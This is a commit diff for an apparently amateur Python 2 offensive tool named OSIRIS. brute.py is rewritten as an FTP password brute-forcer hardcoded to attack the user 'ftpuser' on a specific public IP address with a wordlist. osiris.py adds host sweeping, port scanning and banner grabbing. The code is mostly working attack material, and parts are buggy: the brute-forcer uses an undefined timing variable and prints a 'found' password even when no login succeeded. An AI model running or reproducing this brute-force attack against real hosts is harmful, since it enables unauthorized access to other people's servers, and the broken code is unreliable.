728511d37fcdefb28b006fcfbefe35a37ffd8e4a
Sh3llmask <sh3llmask@gmail.com>
2016-12-08 12:22:44 +0100

    Version 0.2

--- brute.py
+++ brute.py
@@ -1,85 +1,41 @@
-#!/usr/bin/python
- 
-import threading
-import Queue
-import socket
+### 	FTP FORCEBRUTE 	###
+### 	OSIRIS 			###
 import ftplib, sys
 import time
 from progressbar import *
-from datetime import datetime  
 
-passwordList = open('passwords.txt','r').read().splitlines()
- 
-class WorkerThread(threading.Thread) :
- 
-	def __init__(self, queue, tid) :
-		threading.Thread.__init__(self)
-		self.queue = queue
-		self.tid = tid
-	def ftpbreaker(addr, user, passwd):
-		try:
-			con = ftplib.FTP(addr)
-			con.login(user, passwd)
-			con.close()
-			return 1
-		
-		except Exception, error:
-			return 0
-		 
-		except KeyboardInterrupt:
-			sys.exit()
-	def run(self) :
-		while True :
-			addr = ''
-			widgets = ['[>] Brute: ', Percentage(), ' ', Bar(marker='#',left='[',right=']')]	
-			username = "ftpuser"
-			passwdsPath ="E:\passwds.txt"
-			passwdLines = len(open(passwdsPath).readlines())
-			print "[>] Trying passwords for user: "+user
-			bar = ProgressBar(widgets=widgets, maxval=passwdLines)
-			passwdsFile = open(passwdsPath, 'r')
-			bar.start()
-			c=0
-			t1 = datetime.now()
-			try :
-				username = self.queue.get(timeout=1)
- 
-			except 	Queue.Empty :
-				return
- 
-			try :
-				for password in passwordList:
-					con = ftpbreaker(addr, user, passwd)
-					c+=1
-					bar.update(c)
-					if con == 1:
-						break
-				bar.finish()
-				print "[!] Password found :) > "+passwd
-				print "[?] The brute force took: "+str(t)	
-				print "[?] Target: " +addr
+def ftpbreaker(addr, user, passwd, i):
+	try:
+		con = ftplib.FTP(addr)
+		con.login(user, passwd)
+		con.close()
+		return 1
+
+	except Exception, error:
+		return 0
+
+	except KeyboardInterrupt:
+		sys.exit()
+addr ="91.134.135.18"
+port ="21"
+widgets = ['[>] Brute: ', Percentage(), ' ', Bar(marker='#',left='[',right=']')]
+user = "ftpuser"
+passwdsPath ="passwds.txt"
+passwdLines = len(open(passwdsPath).readlines())
+print "[>] Trying passwords for user: "+user
+bar = ProgressBar(widgets=widgets, maxval=passwdLines)
+passwdsFile = open(passwdsPath, 'r')
+bar.start()
+c=0
+#t1 = datetime.now()
+for passwd in passwdsFile:
+	con = ftpbreaker(addr, user, passwd, c)
+	c+=1
+	bar.update(c)
 	if con == 1:
 		break
-			except :
-				raise 
- 
-			self.queue.task_done()
- 
-queue = Queue.Queue()
- 
-threads = []
-for i in range(1, 40) : # Number of threads
-	worker = WorkerThread(queue, i) 
-	worker.setDaemon(True)
-	worker.start()
-	threads.append(worker)
-     # Push usernames onto queue
- 
-queue.join()
- 
-# wait for all threads to exit 
- 
-for item in threads :
-	item.join()
- 
-print "Testing Complete!"
+bar.finish()
+#t2 = datetime.now()
+#t = t2-t1
+print "[!] Password found :) > "+passwd
+print "[?] The brute force took: "+t
--- osiris.py
+++ osiris.py
@@ -1,10 +1,7 @@
-import sys
-import time
-import os
-import platform
-import subprocess
-import socket
-import random
+#!/usr/bin/env python
+
+import sys, time, os, platform, subprocess, socket, random
+from optparse import OptionParser
 from banners import bannerChoice
 from banners import leaving
 from datetime import datetime
@@ -21,35 +18,46 @@ ext = leaving()
 
 def usage():
 	print """
-	Usage: 
-
+	Usage:
 	python ./osiris.py <target> [Parameters]
-	
+
 	-S [--stealth : Preform a stealth scan]
 	-a [--auto : Standard parameter to scan and find vulnerabilities]
 	-f [ -f (path) : Specify a path for the output file. The default directory is: /output/]
 	-r [--reverse : Take a hostname as a target]
 	-b [Scan the network to find devices]
-	
+
 	Example of usage:
-		
+
 		- Execute osiris and change the output file:
-		
-		> python ./osiris.py 192.168.1.1 -f 
-	
+
+		> python ./osiris.py 192.168.1.1 -f
+
 		- Execute osiris and scans from host 5 to host 100:
-		
-		> python ./osiris.py 192.168.1.5/100 
-		
-		- Execute osiris with a domain name 
-		
+
+		> python ./osiris.py 192.168.1.5/100
+
+		- Execute osiris with a domain name
+
 		> python ./osiris.py http://www.facebook.com/ -r
 	"""
-def iCheck():
-	# Connectivity checking
-	# Check modules needed to run osiris
-	print "Checking..."
-	
+# def iCheck():
+# #Initial Check
+	# FNULL = open(os.devnull, 'w')
+	# # Connectivity checking
+	# obt = "25.5.5.5"
+	# ctvt = ping(obt)
+	# if (ctvt == True):
+		# conectivity = True
+	# else:
+		# conectivity = False
+	# # Check modules needed to run osiris
+	# try:
+		# #First checks if the nmap is installed
+		# nmap = subprocess.call(['nmap','-V'], stdout=FNULL, stderr=subprocess.STDOUT)
+		# nmapInstalled = True
+	# except:
+		# print "[!] Nmap not installed!"
 def ping(addr):
 #Performs a simple ICMP Request to check if the host is up.
 	ops = platform.system()
@@ -69,8 +77,8 @@ def ping(addr):
 			return False
 	except KeyboardInterrupt:
 		print ext
-		sys.exit()	
-		
+		sys.exit()
+
 def portScan(port, addr):
 	#Function used to scan the listed ports and see which ones are open
 	try:
@@ -88,27 +96,68 @@ def portScan(port, addr):
 		sys.exit()
 	except socket.error:
 		print "[!] Couldn't connect to the server"
+def bannerGrab (addr, port):
+	try:
+		s = socket.socket()
+		s.connect((addr, port))
+		msg = ""
+		while len(msg) < 1024:
+			chunk = s.recv(1024)
+			if chunk == '':
+				return "[+]=========[-]> Nothing to listen here\n[|]"
+			msg = "[+]=========[-]> "+ msg + chunk
+			return msg
+	except:	
+		return "[+]=========[!]> Couldn't connect to the server\n[|]"
+		# msg = s.recv(1254)
+		# if len(msg)!=0:
+			# msg = "[+]=========[-]> "+msg
+			# return msg
+		# else:
+			# return "[+]=========[-]> Nothing to listen here"
+	# except:
+		# print "[+]=========[!]> Couldn't connect to the server"
+		# return 
+
 def randomIP(net):
 	byte4 = random.randrange(1,254)
 	scr_addr = net+byte4
 	return scr_addr
-	
+def cloudFlare():
+#Resolves the real IP of a site
+	return
+
 ######### VARIABLES ########
 
 targets = [] 	# A list of targets to scan
 targetsUp = [] 	# All the hosts up
-ports = [21,22,25,53,80,139,443,445,1080,3128,8080,8081]	# List of ports to scan
-openPorts = [] 	# List of open ports 
+# portsFile = open('ports.txt', 'r').readlines
+ports = [21, 22, 23, 80, 139, 443, 8080]
+openPorts = [] 	# List of open ports
 # outputFile = "/output/"+sys.argv[1]+".txt"
 pingConfirm = False
+
+
+### PARSER ###
+
+usage = "usage: %prog -u <Target IP> [options]"
+parser = OptionParser(usage=usage)
+parser.add_option("-u", "--host", dest="Host", help="IP or domain of the target to scan")#, metavar="<IP>")
+parser.add_option("-b", "--brute", action="store_true", dest="bruteForce", default=False, help="Use this option to enable brute force")
+parser.add_option("-f", "--output", dest="outputFile", help="Specify the output path")
+(options, args) = parser.parse_args()
+
+
 
 if len(sys.argv)<2:
 	usage()
 	print ext
 	sys.exit()
-else:
-	address = sys.argv[1]
-	iCheck()
+else: 
+	address = options.Host
+	
+print address
+print socket.gethostbyaddr(address)
 	
 ############# ARGUMENTS IDENTIFICATION ############
 
@@ -116,7 +165,7 @@ if "/" in address: # If there's a slash on the IP this will check all the target
 	pingConfirm = False
 	addS = address.split("/")
 	ip = addS[0]
-	hostRange = int(addS[1]) 
+	hostRange = int(addS[1])
 	netS = ip.split(".")
 	net = netS[0]+"."+netS[1]+"."+netS[2]+"."
 	firstIP = int(netS[3])
@@ -124,12 +173,12 @@ if "/" in address: # If there's a slash on the IP this will check all the target
 		addr = net+str(su)
 		targets.append(addr) #Stores the IPs in the targets list
 elif("-r"in sys.argv)or("--reverse"in sys.argv):
-	# If the host is provided by a domain address 
+	# If the host is provided by a domain address
 	# Converts the hostname to IPv4 format
-	ipv4 = socket.gethostbyname('sys.argv[1]')
-	address = ipv4
+	ipv4 = socket.gethostbyname(address)
+	print "[?] The domain: "+address+" seems to be: "+ipv4
 	targets.append(address)
-elif("-fk"in sys.argv or "--fake"in sys.argv):
+elif("-fk"in sys.argv) or ("--fake"in sys.argv):
 	fakeIP = randomIP(net)
 elif("-f"in sys.argv):
 	#Output file
@@ -139,21 +188,21 @@ elif("-f"in sys.argv):
 	if ((outputFileD=="y")or(outputFileD=="Y")):
 		outputFile = raw_input("[>] Specify the path of the new output file: ")
 		print "[!] New output file set to: " +outputFile
-	else: 
-		pass	
+	else:
+		pass
 else:
 	targets.append(address)
-ct = len(targets)		
+ct = len(targets)
 if ct != 0: # If there is no targets the program will finish
 	print "[?] The number of: "+str(ct)+" hosts are going to be scanned."
 else:
 	print "[!] No targets found"
 	print ext
 	sys.exit()
-ti1 = datetime.now()
 
 ######### ICMP Request #########
 
+ti1 = datetime.now()
 for t in targets:
 	icmp = ping(t)
 	if icmp == True: #If we have a ICMP Response the host will be up. The current target of the loop will be stored in targetsUp
@@ -182,19 +231,25 @@ time.sleep(1)
 ts1 = datetime.now()
 print "[>] Starting port scanner at: ", ts1
 for i in targetsUp:
-	print "[>] Scannig the target: " + i 
+	print "[>] Scannig the target: " + i
 	print "_"*60
 	print ""
 	for port in ports:
 		ptrscn = portScan(port, i)
 		if ptrscn == True:
-			print "[|] "+str(i)+":"+str(port)+"		- OPEN"
+			print "[|] "+str(i)+":"+str(port)+"/TCP	- OPEN"
 			openPorts.append(port)
+			print bannerGrab(i, port)
 		else:
-			print "[-] "+str(i)+":"+str(port)+"		- CLOSED"
+			print "[-] "+str(i)+":"+str(port)+"		- CLOSED\n[|]"
 	print ""
 	print "*"*60
-	print ""
+	oPts = len(openPorts)
+	if oPts == 0:
+		print "[!] No open ports!"
+	elif oPts > 0:
+		print "[?] We have discovered "+str(oPts)+" open ports"
 ts2 = datetime.now()
 tst = ts2 - ts1
 print "\n[?] The scanner took: ", tst, "to scan the ports"
+#https://pentestlab.blog/2012/03/01/attacking-the-ftp-service/
